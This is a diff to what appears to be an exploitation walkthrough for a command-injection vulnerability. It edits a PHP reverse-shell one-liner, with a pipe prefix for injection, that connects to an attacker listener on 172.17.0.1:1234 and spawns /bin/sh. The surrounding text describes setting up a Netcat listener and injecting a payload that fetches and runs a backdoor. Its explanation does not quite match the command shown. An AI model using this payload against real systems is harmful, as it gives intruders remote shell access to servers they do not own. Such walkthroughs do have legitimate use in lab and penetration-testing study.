@@ -45,7 +45,7 @@ Set up a listener on a specific port (e.g., 1234) using the following command
 - With confirmation of the vulnerability, inject a payload that will download and execute your backdoor script from the Python HTTP server.
 - Example command to inject
 
-  `php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3"):'`
+  `| php -r '$sock=fsockopen("172.17.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
 ### Explanation
 - This command tells the server to fetch the backdoor script from your Python HTTP server and execute it using PHP. Once executed, the backdoor will initiate a connection to your Netcat listener.
 
